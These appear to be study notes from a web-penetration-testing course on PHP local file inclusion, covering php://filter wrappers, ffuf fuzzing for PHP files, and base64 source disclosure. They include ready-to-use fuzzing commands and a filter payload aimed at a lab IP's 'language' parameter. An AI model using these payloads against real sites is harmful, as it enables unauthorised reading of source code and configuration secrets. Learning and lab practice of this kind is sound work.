We can utilize PHP Wrappers to extend LFI to remote code execution (php://)

## Input Filters
php://filter/
- resource
- read

4 different types of filters:
- String Filters
- Conversion Filters
- Compression Filters
- Encryption Filters

Useful filters:
- convert.base64-encode


## Fuzzing for PHP Files
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
- Looking for HTTP response codes 200, 301, 302, and 403
- Spider to find all referenced PHP files


## Standard PHP Inclusion
Many .php files do not print to the screen because they don't render HTML output and instead execute code. Therefore, use the base64 php filter.
In the case that the web app does not execute code, it will show the source code.

## Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=config
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```
- This web app appends .php to the url, so we purposefully left it out

```shell-session
ffuf -ac -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.48.12:46011/FUZZ.php
```
```
http://94.237.48.12:46011/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```
